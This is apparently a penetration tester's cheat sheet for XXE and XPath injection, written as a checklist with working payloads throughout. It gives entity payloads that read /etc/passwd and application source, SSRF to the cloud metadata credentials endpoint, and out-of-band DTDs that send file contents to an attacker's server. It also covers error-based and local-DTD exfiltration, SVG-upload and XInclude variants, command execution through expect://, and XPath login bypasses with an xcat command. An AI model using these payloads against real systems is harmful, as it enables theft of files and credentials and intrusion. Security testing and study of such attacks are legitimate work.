# XXE

## Where XML goes in
- [ ] Every XML body: SOAP, uploads of SVG, DOCX or XLSX, feeds and imports
- [ ] A JSON request resent with Content-Type: application/xml and the same fields as XML
In Burp Repeater, the app's own request with a DOCTYPE after the first line, and &xxe; in a field the page shows:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
Or from the shell, with that request saved as xxe.xml:
curl -sk -X POST '<Scheme>://<WebHost>/THE-PAGE' -H 'Content-Type: application/xml' --data-binary @xxe.xml
- [ ] Windows: file:///c:/windows/win.ini
- [ ] Next: SSH keys, the app's config, /proc/self/environ

## Files with < or & in them
PHP source breaks the XML as it is, so it comes back base64:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"> ]>
echo 'THE-BASE64' | base64 -d

## Through the parser to the inside
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:<Port>/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
- [ ] The rest of the inside and the cloud: :Pb ssrf

## Nothing comes back: a callback
sudo python3 -m http.server 80
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<LHOST>/xxe-test"> %xxe; ]>
- [ ] A hit in the log: the parser fetches my files

## Out of band, with my DTD
In the folder python serves:
cat > exploit.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<LHOST>/?x=%file;'>">
%eval;
%exfil;
EOF
Sent to the target:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<LHOST>/exploit.dtd"> %xxe; ]>
- [ ] A file of more than one line breaks the URL: php://filter base64 on PHP, or the error way below

## The file in an error message
The same request, with this exploit.dtd:
cat > exploit.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
EOF
No way out at all: a DTD already on the target, here GNOME's docbookx.dtd and its ISOamso entity.
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
- [ ] On Windows: C:\Windows\System32\wbem\xml\cim20.dtd

## Only one value is mine
XInclude, in place of that value:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

## An SVG upload
cat > xxe.svg <<'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="512px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
EOF
- [ ] Uploaded as an avatar or image, the file is drawn in the picture

## A command, on PHP with expect
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>

## XML queried with XPath
- [ ] A lone ' gives an error naming XPath or SimpleXMLElement
In a login, both fields, until one gets in:
' or '1'='1
' or ''='
admin' or '1'='1
x' or 1=1 or 'x'='y
A search field that shows a match, walked a character at a time:
')] | //user/*[contains(*,'
THE-NAME') and starts-with(../password,'a
xcat does the walk, with THE-WORD the text a true answer shows:
pipx install xcat
xcat run '<Scheme>://<WebHost>/THE-PAGE' <Param> <Param>=THE-NAME --true-string=THE-WORD
